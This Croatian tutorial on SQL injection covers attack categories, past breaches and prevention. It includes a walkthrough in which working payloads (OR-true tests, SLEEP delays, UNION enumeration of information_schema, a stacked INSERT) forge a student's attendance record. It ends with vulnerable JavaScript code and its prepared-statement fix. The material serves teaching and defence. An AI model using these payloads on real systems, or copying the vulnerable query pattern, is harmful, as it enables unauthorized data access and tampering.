---
title: SQL injekcija
---

# SQL injekcija

## Teorijski uvod

SQL injekcija je tehnika ubacivanja SQL koda u polja za korisnički unos, s ciljem dobivanja neovlaštenog pristupa informacijama ili uništavanja baze podataka. SQL injekcija moguća je samo kod upita koji uzimaju korisnički unos i rade SQL upit dinamički, bez provjere samog unosa. Ukoliko je aplikacija ranjiva, korisnik može kontrolirati što se izvršava na bazi podataka. Napad SQL injekcijom sastoji se od ubacivanja ili injekcije djelomičnog ili cijelog SQL upita pomoću polja za korisnički unos. Uspješan napad može rezultirati čitanjem osjetljivih informacija pohranjenih u bazi podataka, modificiranjem podataka pomoću naredbi poput INSERT, UPDATE i DELETE, gašenjem baze podataka, pronalaženjem i preuzimanjem datoteka iz datotečnog sustava baze podataka, i u nekim slučajevima, izvršavanjem naredbi na operacijskom sustavu.

**Napadi se mogu podijeliti u 3 kategorije:**

- **Napad unutar kanala** - Podaci se izvlače korišteći isti komunikacijski kanal koji se koristi za ubacivanje SQL koda. Ovo je najizravnija vrsta napada u kojoj se dohvaćeni podaci prikazuju izravno na web stranici aplikacije (ova vrsta napada je pokazana na primjeru).
- **Napad izvan kanala** - Podaci se dohvaćaju koristeći drugačiji kanal (npr. slanje e-maila s rezultatima upita napadaču).
- **Slijep napad** - Nema stvarnog prijenosa podataka iz baze podataka prema napadaču. Umjesto toga, napadač može rekonstruirati informacije slanjem određenih upita i promatranjem ponašanja DBMS-a, kao što su kašnjenja u odgovoru ili različiti odgovori aplikacije ovisno o tome je li upit istinit ili lažan.

**Najčešće tehnike za iskorištavanje pronađenih ranjivosti koje mogu biti korištene zasebno ili kombiniranjem više tehnika od jednom:**

- **UNION operator** - Može se koristiti kada se ranjivost dogodi u SELECT naredbi, omogućujući kombiniranje dva upita u jedan rezultat.
- **Logička metoda** - Koristi logičke uvjete kako bi se provjerilo jesu li određeni uvjeti istiniti ili lažni, na temelju proučavanja HTTP odgovora.
- **Namjerno izazivanje greške** - Tehnika prisiljavanja baze podataka da generira grešku kako bi napadač na temelju tih informacija mogao poboljšati svoj zlonamjerni upit. Namjernim izazivanjem greške napadači mogu dobiti informacije o bazi podataka i njenoj strukturi.
- **Vremenska odgoda** - Koristi naredbe poput SLEEP za odgađanje odgovora u uvjetnim upitima. Korisno kada se ne dobiva nikakav odgovor jer proučavanjem vremena potrebnog za odgovor napadač može saznati je li upit istinit ili lažan.

**Neke velike kompanije koje su bile žrtv napada SQL injekcijom:**

- **Sony Pictures**: 2011. godine napad SQL injekcijom rezultirao je krađom otprilike 77 milijuna PlayStation Network računa, ukupne štete oko 170 milijuna dolara.
- **Yahoo!**: Tvrtka je bila žrtva više napada između 2013. i 2016. godine, pri čemu je u najvećem napadu ukradeno preko pola milijuna email adresa i lozinka. Sveukupna šteta svih napada bila je preko 3 milijarde korisničkih računa.
- **JPMorgan Chase**: JPMorgan Chase je jedna on nejvećih banka u Sjedinjenim Američkim Državama. 2014. godine objavili su da su računi od preko 76 milijuna kućanstva kompromizirani. Ukradeni podaci uključuju imena, brojeve mobitela i e-mail adrese korisnika, ali ne podatke vezane uz njihove financije.

**Kako spriječiti napad SQL injekcijom?**

- **Korištenje pripremljenih upita** - Pripremljeni upiti omogućuju da se korisnički unos tretira isključivo kao podatak, a ne kao dio SQL naredbe, čime se sprječava manipulacija strukturom upita. Ovo je najučinkovitija i najčešće preporučena metoda zaštite od SQL injekcije.
- **Validacija i filtriranje korisničkih unosa** - Potrebno je provjeriti ispravnost tipa, formata i dužine ulaznih podataka. Primjerice, ako se očekuje unos JMBAG-a, potrebno je provjeriti je li unos u ispravnom formatu (samo znamenke od 0 do 9, točno 10 znamenaka).
- **Princip najmanjih privilegija** - Korisnički računi baze podataka kojima pristupa aplikacija trebaju imati samo minimalne potrebne dozvole. Time se ograničava potencijalna šteta u slučaju uspješnog napada.
- **Sakrivanje i maskiranje poruka o greškama** - Poruke o greškama koje baza podataka vraća ne bi trebale otkrivati detalje o strukturi baze podataka ili upitima, jer takve informacije mogu pomoći napadaču.

## Osnovni primjer SQL injekcije

Zamislimo da imamo tablicu studenata s poljima `jmbag`, `ime` i `prezime`. U aplikaciji postoji forma za pretraživanje studenata po imenu. Upit koji se koristi za dohvat studenta može izgledati ovako:

```sql showLineNumbers=false
SELECT * FROM student WHERE ime = 'Karlo';
```

Ukoliko web aplikacija gradi upite dinamički, spajanjem stringova i pri tome ne koristi odgovarajuće provjere, napadač u polje za pretraživanje imena može napisati na primjer `Karlo'; DROP TABLE student; --`. Upit onda postaje:

```sql showLineNumbers=false
SELECT * FROM student WHERE ime = 'Karlo'; DROP TABLE student; --';
```

Da bi ovaj upit stvarno rezultirao brisanjem cijele tablice studenata, mnogo stvari se mora savršeno posložiti. Korisnički račun morao bi imati `DROP` privilegije, baza podataka mora podržavati izvršavanje više naredbi u jednom pozivu, primarni ključ tablice student ne smije biti vanjski ključ na druge tablice s `ON DELETE RESTRICT` ograničenjem i tako dalje. Međutim, čak i kad brisanje tablice nije moguće, SQL injekcija i dalje predstavlja ozbiljan sigurnosni rizik. Napadači mogu pristupiti osjetljivim podacima, zaobići autentifikaciju ili modificirati postojeće podatke.

## Praktičan primjer - dodavanje prisutnosti

### Provjera ranjivosti

Pretpostavimo da smo student i imamo pristup nekakvoj formi za pretraživanje podataka pomoću JMBAG-a. Prvo što moramo provjeriti je ranjivost forme na SQL injekciju. Najčešći testovi za to su korištenje OR uvjeta ili funkcije za zaustavljanje izvršavanja na ordređeni broj sekundi (SLEEP()).

Testirati ranjivost možemo na sljedeće načine:

- Korištenjem `OR` uvjeta - `' OR '1'='1 #`, rezultat bi trebao biti jedan ili više studenata (**Oprez:** mnogo aplikacija koristi jedan odgovor za izvršavanje više od jednog upita. Ukoliko jedan od njih sadrži DELETE ili DROP naredbu, može doći do brisanja tablice ili baze podataka).
- Korištenjem funckije za odgodu izvršavanja upita - `0246801234' AND SLEEP(3) #`, rezultat bi trebao biti odgovor nakon 3 sekunde.

### Broj stupaca u tablici

Sad moramo saznati koliko stupaca ima tablica, da bi kasnije mogli koristiti UNION operator za kombiniranje rezultata našeg upita i upita koji se obično šalje bazi podataka. Testiranje radimo tako da probamo samo sa jednim stupcem, zatim s dva i tako dalje.

- `' UNION SELECT 1 #` - greška
- `' UNION SELECT 1, 2 #` - greška
- ...

```text showLineNumbers=false
' UNION SELECT 1, 2, 3, 4, 5, 6, 7, 8, 9 #
```

### Imena svih tablica

Sljedeći korak je otkriti koje sve tablice postoje u bazi podataka i pronaći strukturu tablice u kojoj se bilježi prisutnost. U formu unosimo:

```text showLineNumbers=false
' UNION SELECT table_name, table_schema, 'a', 'b', 'c', 'd', 2025, 'e', 1
FROM information_schema.tables
WHERE table_schema = database() #
```

- `information_schema` - posebna baza podataka u MySQL-u koja sadrži podatke o svim drugim bazama podataka
  - `tables` - tablica s informacijama o svim drugim tablicama
    - `table_name` - stupac koji sadrži sva imena tablica
    - `table_schema` - stupac koji sadrži naziv baze podataka
- `database()` - funkcija koja vraća naziv trenutno aktivne baze podataka
- U stupce koji nam ne trebaju unosimo nasumične podatke da bi broj stupaca u oba upita ostao isti.

### Strukture određenih tablica

Sad znamo da postoji tablica za `prisutnost` i možemo provjeriti koje stupce sadrži. `information_schema` također sadrži i tablicu `columns` u kojoj se nalaze imena svih stupaca i njihovih tipova.

```text showLineNumbers=false
' UNION SELECT column_name, data_type, 'a', 'b', 'c', 'd', 2025, 'e', 1
FROM information_schema.columns
WHERE table_name = 'prisutnost' AND table_schema = database() #
```

Sad vidimo da za unos prisutnosti moramo znati točan `stud_predmet` koji se odnosi na nas. Moramo pronaći iz koje tablice dolazi `stud_predmet`. Možemo pretpostaviti da je `stud_predmet` vanjski ključ na tablicu `student_predmet`, pa pogledamo njenu strukturu (u prošlom unosu samo zamijenimo vrijednost table_name).

```text showLineNumbers=false
' UNION SELECT column_name, data_type, 'a', 'b', 'c', 'd', 2025, 'e', 1
FROM information_schema.columns
WHERE table_name = 'student_predmet' AND table_schema = database() #
```

### Dobivanje podataka iz drugih tablica

Sad možemo nastaviti na nekoliko načina. Prvi je da pogledamo strukturu tablica `predmet` (pretpostavimo da `predmet_id` dolazi iz te tablice) i zatim pretražimo tablicu `student_predmet` s našim JMBAG-om i odgovarajućim predmetom da nađemo id koji nam treba za evidenciju. Drugi je da pogledamo sve retke iz tablice `student_predmet` i nađemo retke s našim JMBAG-om. S tim informacijama možemo pogledati u tablicu `prisutnost` i vidjeti po datumima predavanja na koji se predmet odnosi koji id (usporedimo s rasporedom). Drugi način je brži pa koristimo taj.

Dobivanje svih retka s našim JMBAG-om iz tablice `student_predmet`:

```text showLineNumbers=false
' UNION SELECT id, 'f', 'a', 'b', 'c', 'd', 2025, 'e', 1
FROM student_predmet
WHERE jmbag = '0246801235' #
```

Pregled prisutnosti samo s pronađenim `stud_predmet`:

```text showLineNumbers=false
' UNION SELECT stud_predmet, datum, 'a', 'b', 'c', 'd', 2025, 'e', 1
FROM prisutnost
WHERE stud_predmet = 3 OR stud_predmet = 4 #
```

Zaključimo da predavanje je točna vrijednost za stud_predmet 3 i na temelju toga možemo dodati novu prisutnost.

### Dodavanje novog retka u tablicu prisutnost

**Napomena:** Posljednji upit sadrži više od jedne naredbe (SELECT i INSERT). Izvršavanje više od jedne naredbe u istom upitu u MySQL-u moguće je samo ako je omogućena opcija `allowMultipleStatements`. Zbog sigurnosnih razloga (upravo ovih demonstriranih), ta mogućnost ne može biti omogućena na [aiven.io](https://aiven.io).

```text showLineNumbers=false
'; INSERT INTO prisutnost (stud_predmet, datum) VALUES (3, '2025-06-06'); #
```

## Primjeri POST zahtjeva

### Primjer ranjivog koda

```js title="upit.js" {"1. const jmbag simulira korisnički unos (npr. forma)":3-5} collapse={10-21, 23-28}
const POST = async ({ request }) => {
  try {

    const jmbag = "0246801234";
    const upit = "SELECT * FROM student WHERE jmbag = '" + jmbag + "'";

    const connection = await mysql.createConnection(dbConfig);
    const [rezultati] = await connection.execute(upit);
    await connection.end();

    if (rezultati.length === 0) {
      return new Response(JSON.stringify({ error: "Student nije pronađen" }), {
        status: 404,
        headers: { "Content-Type": "application/json" },
      });
    }

    return new Response(JSON.stringify(rezultati), {
      status: 200,
      headers: { "Content-Type": "application/json" },
    });
  } catch (error) {
    console.error("Error prilikom izvršavanja upita:", error);

    return new Response(JSON.stringify({ error: "Internal Server Error" }), {
      status: 500,
      headers: { "Content-Type": "application/json" },
    });
  }
};
```

### Kako popraviti ovaj primjer?

Način na koji možemo poboljšati kod da spriječimo ovaj napad je zapravo vrlo jednostavan i može se napraviti za minutu ili dvije, korištenjem pripremljenih upita i osnovne provjere unosa. Pripremljeni upiti su gotovo jednaki u sintaksi kao i standardni upiti, međutim umjesto umetnutih vrijednosti (kao u gornjem primjeru), na mjestima za parametre koriste **placeholdere**.

Osnovna sintaksa za MySQL (na gornjem primjeru):

```sql showLineNumbers=false
SELECT * FROM student WHERE jmbag = ?;
```

Korištenje pripremljenih upita ima nekoliko prednosti:

1. Bolje performanse baze
2. Logika je odvojena od samih podataka
3. Podaci se tretiraju kao tekstualni tipovi, a ne kao dio sql koda (upisivanjem na primjer `' OR '1'='1`, baza podataka probala bi naći studenta koji doslovno ima jmbag `' OR '1'='1`).

Modificirani kod s pripremljenim upitom i osnovnom provjerom unosa:

```js title="upit.js" del={4, 13} add={5, 7-10, 14}
const POST = async ({ request }) => {
  try {
    const jmbag = "0246801234";
    const upit = "SELECT * FROM student WHERE jmbag = '" + jmbag + "'";
    const upit = "SELECT * FROM student WHERE jmbag = ?";

    const regex = /^[0-9]{10}$/;
    if (!regex.test(jmbag)) {
      // Ako jmbag ne odgovara formatu, vraćamo grešku
    }

    const connection = await mysql.createConnection(dbConfig);
    const [rezultati] = await connection.execute(upit);
    const [rezultati] = await connection.execute(upit, [jmbag]);
    await connection.end();

    // Ostatak ostaje isti
```
